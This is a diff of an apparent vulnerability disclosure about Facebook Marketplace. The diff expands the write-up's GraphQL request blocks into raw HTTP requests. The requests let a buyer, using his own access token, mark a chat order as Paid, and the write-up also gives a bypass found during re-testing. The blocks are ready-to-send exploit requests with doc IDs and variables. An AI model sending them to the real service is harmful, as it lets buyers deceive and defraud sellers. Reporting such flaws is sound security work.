@@ -26,9 +26,17 @@ The result misleads the seller (UI shows the order as *Paid* and hides the Mark 
 4. **UserB** obtains his own **business/android access token** and the **thread/message ID** for the Marketplace chat.  
 5. Using the **Graph API Explorer** (or any HTTP client), **UserB** sends a **POST** to GraphQL with the following parameters:
 
-### 📤 Request (Original)
+### 📤 Request
 ```http
-POST https://graph.facebook.com/graphql
+POST /graphql
+Host: graph.facebook.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Origin: https://www.graph.facebook.com
+Connection: close
 
 &doc_id=5583150721696906&variables={"input": {"client_mutation_id": "1","actor_id": "1","is_mark_as_paid": true,"message_thread_id": "{ID_MESSAGE}","should_update_thread_label": false,"surface": "MESSENGER_LIGHTSPEED_BANNER"}}&access_token={UserB_access_token}
 ```
@@ -53,14 +61,30 @@ During re‑testing, another GraphQL flow still allowed the buyer to reach the *
 
 ### 1) Retrieve the Marketplace thread info by Item ID
 ```http
-POST https://graph.facebook.com/graphql
+POST /graphql
+Host: graph.facebook.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Origin: https://www.graph.facebook.com
+Connection: close
 
 &doc_id=4299671400131216&variables={"cappedScale": 2,"id": "{ID_MARKETPLACE_ID}","MarketplaceProductImage_LARGE_SIZE": 189,"MarketplaceProductImage_SMALL_SIZE": 137,"MarketplaceProductItemMessageThread_STICKER_SIZE": 39,"showCombinedInbox": false,"showInboxTaggingRedesign": true,"useUnifiedInboxStyle": true,"shouldUseServerManagementActionsForAATest": false,"shouldUseNewInventoryActionSheet": false,"filterLabels": [],"scale": 2.625}&access_token={UserB_access_token}
 ```
 
 ### 2) Mark as Paid via alternative mutation
 ```http
-POST https://graph.facebook.com/graphql
+POST /graphql
+Host: graph.facebook.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Origin: https://www.graph.facebook.com
+Connection: close
 
 &doc_id=3163078603755877&variables={"input": {"client_mutation_id": "45","actor_id": "0","message_thread_graphql_ids": ["{ID_MessageThread}"],"referral_surface": "unknown","surface": "mark_as_paid_multi_select_page"}}&access_token={UserB_access_token}
 ```
